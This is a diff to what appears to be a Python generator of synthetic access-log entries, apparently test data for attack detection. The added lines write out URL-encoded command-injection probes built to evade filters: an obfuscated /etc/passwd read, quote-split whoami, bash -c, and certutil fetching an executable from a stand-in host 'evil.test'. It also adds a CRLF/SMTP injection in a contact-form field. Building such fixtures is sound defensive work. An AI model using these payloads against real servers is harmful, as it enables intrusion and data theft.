@@ -686,9 +686,29 @@ def command_injection(ip: str, day: int, hour: int) -> None:
         # `if exist … ` — the batch conditional, which is the third shape in
         # the pack and the one the other lines here do not carry.
         "/ping?host=if%20exist%20c%3A%5Cwindows%5Csystem32%20echo%20yes",
+        # Then the forms written to get past a filter that knows those words:
+        # a glob standing in for /etc/passwd, brace expansion, a command name
+        # split by quotes, an empty substitution inside `ping`, a shell told
+        # to run a command, and Windows' own downloader.
+        "/ping?host=127.0.0.1%3Bcat%20/etc/pa%5Bs%5Dswd",
+        "/ping?host=%7B,ifconfig%7D",
+        "/ping?host=127.0.0.1%3B%27wh%27oami",
+        "/ping?host=pi%24%28%29ng%20127.0.0.1",
+        "/ping?host=127.0.0.1%3Bbash%20-c%20%22id%22",
+        "/ping?host=127.0.0.1%26certutil%20-urlcache%20-f%20http%3A//evil.test/x.exe",
     ):
         write(t, ip, f"GET {probe} HTTP/1.1", 500, 0, agent=CURL)
         t += timedelta(seconds=11)
+    # The contact form, which hands its fields to the mail server: an SMTP
+    # command smuggled into one of them.
+    write(
+        t,
+        ip,
+        "GET /contact?subject=hi%0d%0arcpt%20to:%3Cvictim@example.com%3E HTTP/1.1",
+        400,
+        96,
+        agent=CURL,
+    )
 
 
 def java_attacks(ip: str, day: int, hour: int) -> None:
